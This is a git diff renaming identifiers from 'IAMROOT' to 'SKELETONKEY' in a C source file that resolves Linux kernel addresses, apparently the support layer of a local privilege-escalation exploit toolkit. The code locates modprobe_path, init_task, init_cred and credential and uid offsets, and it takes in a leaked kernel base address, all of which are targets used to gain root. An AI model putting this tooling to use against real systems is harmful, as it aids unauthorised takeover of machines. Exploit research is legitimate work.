@@ -1,5 +1,5 @@
 /*
- * IAMROOT — kernel offset resolution
+ * SKELETONKEY — kernel offset resolution
  *
  * See offsets.h for the four-source chain (env → kallsyms → System.map
  * → embedded table). This implementation is deliberately small and
@@ -69,7 +69,7 @@ static const struct table_entry kernel_table[] = {
 #define DEFAULT_CRED_EFF_OFFSET    0x740
 #define DEFAULT_CRED_UID_OFFSET    0x4
 
-const char *iamroot_offset_source_name(enum iamroot_offset_source src)
+const char *skeletonkey_offset_source_name(enum skeletonkey_offset_source src)
 {
     switch (src) {
     case OFFSETS_NONE:          return "none";
@@ -117,42 +117,42 @@ static void read_distro(char *out, size_t sz)
 /* ------------------------------------------------------------------
  * Source 1: environment variables
  * ------------------------------------------------------------------ */
-static void apply_env(struct iamroot_kernel_offsets *o)
+static void apply_env(struct skeletonkey_kernel_offsets *o)
 {
     const char *v;
     uintptr_t a;
 
-    if ((v = getenv("IAMROOT_KBASE")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_KBASE")) && parse_addr(v, &a)) {
         if (!o->kbase) o->kbase = a;
     }
-    if ((v = getenv("IAMROOT_MODPROBE_PATH")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_MODPROBE_PATH")) && parse_addr(v, &a)) {
         if (!o->modprobe_path) {
             o->modprobe_path = a;
             o->source_modprobe = OFFSETS_FROM_ENV;
         }
     }
-    if ((v = getenv("IAMROOT_POWEROFF_CMD")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_POWEROFF_CMD")) && parse_addr(v, &a)) {
         if (!o->poweroff_cmd) o->poweroff_cmd = a;
     }
-    if ((v = getenv("IAMROOT_INIT_TASK")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_INIT_TASK")) && parse_addr(v, &a)) {
         if (!o->init_task) {
             o->init_task = a;
             o->source_init_task = OFFSETS_FROM_ENV;
         }
     }
-    if ((v = getenv("IAMROOT_INIT_CRED")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_INIT_CRED")) && parse_addr(v, &a)) {
         if (!o->init_cred) o->init_cred = a;
     }
-    if ((v = getenv("IAMROOT_CRED_OFFSET_REAL")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_CRED_OFFSET_REAL")) && parse_addr(v, &a)) {
         if (!o->cred_offset_real) {
             o->cred_offset_real = (uint32_t)a;
             o->source_cred = OFFSETS_FROM_ENV;
         }
     }
-    if ((v = getenv("IAMROOT_CRED_OFFSET_EFF")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_CRED_OFFSET_EFF")) && parse_addr(v, &a)) {
         if (!o->cred_offset_eff) o->cred_offset_eff = (uint32_t)a;
     }
-    if ((v = getenv("IAMROOT_UID_OFFSET")) && parse_addr(v, &a)) {
+    if ((v = getenv("SKELETONKEY_UID_OFFSET")) && parse_addr(v, &a)) {
         if (!o->cred_uid_offset) o->cred_uid_offset = (uint32_t)a;
     }
 }
@@ -162,8 +162,8 @@ static void apply_env(struct iamroot_kernel_offsets *o)
  * the same "ADDR TYPE NAME" format).
  * ------------------------------------------------------------------ */
 static int parse_symfile(const char *path,
-                         struct iamroot_kernel_offsets *o,
-                         enum iamroot_offset_source tag)
+                         struct skeletonkey_kernel_offsets *o,
+                         enum skeletonkey_offset_source tag)
 {
     FILE *f = fopen(path, "r");
     if (!f) return 0;
@@ -225,7 +225,7 @@ static int parse_symfile(const char *path,
  * Source 4: embedded table — relative offsets, applied on top of kbase
  * if we already have one.
  * ------------------------------------------------------------------ */
-static void apply_table(struct iamroot_kernel_offsets *o)
+static void apply_table(struct skeletonkey_kernel_offsets *o)
 {
     if (!o->kernel_release[0]) return;
 
@@ -268,7 +268,7 @@ static void apply_table(struct iamroot_kernel_offsets *o)
 /* ------------------------------------------------------------------
  * Top-level resolve()
  * ------------------------------------------------------------------ */
-int iamroot_offsets_resolve(struct iamroot_kernel_offsets *out)
+int skeletonkey_offsets_resolve(struct skeletonkey_kernel_offsets *out)
 {
     memset(out, 0, sizeof *out);
 
@@ -313,7 +313,7 @@ int iamroot_offsets_resolve(struct iamroot_kernel_offsets *out)
     return critical;
 }
 
-void iamroot_offsets_apply_kbase_leak(struct iamroot_kernel_offsets *off,
+void skeletonkey_offsets_apply_kbase_leak(struct skeletonkey_kernel_offsets *off,
                                       uintptr_t leaked_kbase)
 {
     if (!leaked_kbase) return;
@@ -322,18 +322,18 @@ void iamroot_offsets_apply_kbase_leak(struct iamroot_kernel_offsets *off,
     apply_table(off);
 }
 
-bool iamroot_offsets_have_modprobe_path(const struct iamroot_kernel_offsets *off)
+bool skeletonkey_offsets_have_modprobe_path(const struct skeletonkey_kernel_offsets *off)
 {
     return off && off->modprobe_path != 0;
 }
 
-bool iamroot_offsets_have_cred(const struct iamroot_kernel_offsets *off)
+bool skeletonkey_offsets_have_cred(const struct skeletonkey_kernel_offsets *off)
 {
     return off && off->init_task != 0 && off->cred_offset_real != 0
            && off->cred_uid_offset != 0;
 }
 
-void iamroot_offsets_print(const struct iamroot_kernel_offsets *off)
+void skeletonkey_offsets_print(const struct skeletonkey_kernel_offsets *off)
 {
     fprintf(stderr, "[i] offsets: release=%s distro=%s\n",
             off->kernel_release[0] ? off->kernel_release : "?",
@@ -341,10 +341,10 @@ void iamroot_offsets_print(const struct iamroot_kernel_offsets *off)
     fprintf(stderr, "[i] offsets: kbase=0x%lx  modprobe_path=0x%lx (%s)\n",
             (unsigned long)off->kbase,
             (unsigned long)off->modprobe_path,
-            iamroot_offset_source_name(off->source_modprobe));
+            skeletonkey_offset_source_name(off->source_modprobe));
     fprintf(stderr, "[i] offsets: init_task=0x%lx (%s)  cred_real=0x%x cred_eff=0x%x uid=0x%x (%s)\n",
             (unsigned long)off->init_task,
-            iamroot_offset_source_name(off->source_init_task),
+            skeletonkey_offset_source_name(off->source_init_task),
             off->cred_offset_real, off->cred_offset_eff, off->cred_uid_offset,
-            iamroot_offset_source_name(off->source_cred));
+            skeletonkey_offset_source_name(off->source_cred));
 }
